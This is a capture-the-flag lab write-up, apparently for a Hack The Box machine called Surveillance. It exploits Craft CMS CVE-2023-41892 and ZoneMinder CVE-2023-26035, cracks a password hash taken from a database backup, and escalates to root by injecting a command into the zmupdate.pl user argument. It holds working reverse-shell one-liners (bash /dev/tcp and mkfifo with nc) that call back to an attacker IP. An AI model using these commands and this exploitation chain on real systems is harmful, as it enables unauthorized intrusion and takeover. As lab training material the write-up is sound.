# nmap Enumeration

```
22/tcp    open     ssh                 syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp    open     http                syn-ack     nginx 1.18.0 (Ubuntu)
|_http-title:  Surveillance 
|_http-favicon: Unknown favicon MD5: 0B7345BDDB34DAEE691A08BF633AE076
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
```
# Web Enumeration
Using ffuf to enumerate the endpoints, we are able to find the following endpoints:
```
/admin/login            [Status: 200, Size: 38436, Words: 1899, Lines: 130, Duration: 337ms]
/admin                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1166ms]
/images                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 323ms]
/index                  [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 1424ms]
/%61dmin                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1146ms]
/admin                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1215ms]
/admin/admin            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1891ms]
/admin/index            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1408ms]
/admin/login            [Status: 200, Size: 38436, Words: 1899, Lines: 130, Duration: 1401ms]
/admin/users            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1367ms]
/css                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 279ms]
/fonts                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 645ms]
/images                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 258ms]
/img                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 239ms]
/index                  [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 1250ms]
/logout                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1555ms]
```

Browsing to http://surveillance.htb/admin/login, we can see that this site uses Craft CMS. Using nuclei, we can see that this site is vulnerable to CVE-2023-41892. 

```
┌──(kali㉿kali)-[~/Desktop/surveillance]
└─$ nuclei -tags craftcms -u http://surveillance.htb
[craft-cms-detect] [http] [info] http://surveillance.htb
[craftcms-admin-panel] [http] [info] http://surveillance.htb/admin/login
[CVE-2023-41892] [http] [critical] http://surveillance.htb/index.php
```

Using the script from here, we can upload a webshell and execute on the sever as ```www-root```

```
┌──(kali㉿kali)-[~/Desktop/surveillance]
└─$ python3 exploit1.py --url http://surveillance.htb
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ id; whoami; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
surveillance
```

Using this rce exploit, we can then obtain a reverse shell connection to the server on our local listener

```
┌──(kali㉿kali)-[~/Desktop/surveillance]
└─$ python3 exploit1.py --url http://surveillance.htb
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ echo $SHELL

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.2/4000 0>&1'
--------------------------------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000                                           
listening on [any] 4000 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.245] 35726
bash: cannot set terminal process group (1109): Inappropriate ioctl for device
bash: no job control in this shell
www-data@surveillance:~/html/craft/web/cpresources$ 
```

# Privilege Escalation to matthew
Inside the ```~/html/craft/storage/backups``` directory, we are able to find zip file for backups

```
www-data@surveillance:~/html/craft/storage/backups$ ls -a
ls -a
.  ..  surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

Unzipping the file, we realize that the zip files contain sql files. In the sql file, we are able to find the hash for ```matthew```

```
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
```

Using JohnTheRipper, we can then crack the password hash as ```starcraft122490 ```

```
┌──(kali㉿kali)-[~/Desktop/surveillance]
└─$ john --format=raw-sha256 --wordlist=rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
starcraft122490  (?)     
1g 0:00:00:00 DONE (2023-12-22 22:04) 3.448g/s 12316Kp/s 12316Kc/s 12316KC/s stefon23..srflo1
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

Using the password obtained, we can then gain access to the server as ```matthew```

```
┌──(kali㉿kali)-[~/Desktop/surveillance]
└─$ ssh matthew@10.10.11.245   
The authenticity of host '10.10.11.245 (10.10.11.245)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:23: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.245' (ED25519) to the list of known hosts.
matthew@10.10.11.245's password: 
...
matthew@surveillance:~$ id
uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
```

# Obtaining user flag

```
matthew@surveillance:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .profile  user.txt
matthew@surveillance:~$ cat user.txt
<redacted user flag>
matthew@surveillance:~$ 
```

# Privilege Escalation to zoneminder
Using linpeas, we can see that there is an open port 8080 on the localhost

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                  
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                              
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:13842           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Since we know that there is an open port 8080 on the localhost, we will have to forward the port to our local machine

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -L 8080:127.0.0.1:8080 matthew@10.10.11.245
matthew@10.10.11.245's password: 
```

Browsing to http://127.0.0.1:8080, we realize that this is a ZoneMinder login page, but the default credentials (admin/admin) cannot be used to authenticate to the page. Checking the exploits for zoneminder, we are able to find CVE-2023-26035. Using the exploit code from https://github.com/rvizx/CVE-2023-26035, we are able to spawn a reverse shell connection to our local listener

```
┌──(kali㉿kali)-[~/Desktop/surveillance/CVE-2023-26035]
└─$ python3 exploit.py -t http://127.0.0.1:8080 -ip 10.10.16.2 -p 3000
[>] fetching csrt token
[>] recieved the token: key:e6ac41ca172d4191315296f942f0ceea0d1c38e6,1703314037
[>] executing...
[>] sending payload..
-----------------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.245] 50636
bash: cannot set terminal process group (1109): Inappropriate ioctl for device
bash: no job control in this shell
zoneminder@surveillance:/usr/share/zoneminder/www$ id
uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
```

# Privilege Escalation to root
Checking the permissions of zoneminder, we realize that we are able to execute all the binaries in /usr/bin with the following format ```zm[a-zA-Z]*.pl``` w ith root permissions. Filtering the binaries in /usr/bin, these are the binaries that can be executed with root permissions

```
zoneminder@surveillance:/usr/share/zoneminder/www$ ls -a /usr/bin | grep zm | grep .pl
ls -a /usr/bin | grep zm | grep .pl
zmaudit.pl
zmcamtool.pl
zmcontrol.pl
zmdc.pl
zmfilter.pl
zmonvif-probe.pl
zmonvif-trigger.pl
zmpkg.pl
zmrecover.pl
zmstats.pl
zmsystemctl.pl
zmtelemetry.pl
zmtrack.pl
zmtrigger.pl
zmupdate.pl
zmvideo.pl
zmwatch.pl
zmx10.pl
```

Doing code audit, we find that ```zmupdate.pl``` does not properly sanitize its inputs and we can use it to trigger a reverse shell payload with root privileges. NOTE that the user parameter must be used with single quotes. Using double quotes will trigger the reverse shell payload but it does not give a root shell

```
zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --version=1 --user='$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.2 4000 >/tmp/f)' --pass=password              
passwordmkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.2 4000 >/tmp/f)' --pass=p

Initiating database upgrade to version 1.36.32 from version 1

WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort : 

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : n

Upgrading database to version 1.36.32
Upgrading DB to 1.26.1 from 1.26.0
-----------------------------------------------------------------------------------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~/Desktop/surveillance/CVE-2023-26035]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.245] 36640
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

# Obtaining root flag
```
# cat /root/root.txt
65a5e2f6e3744585567d2aa8a84db3a8
```
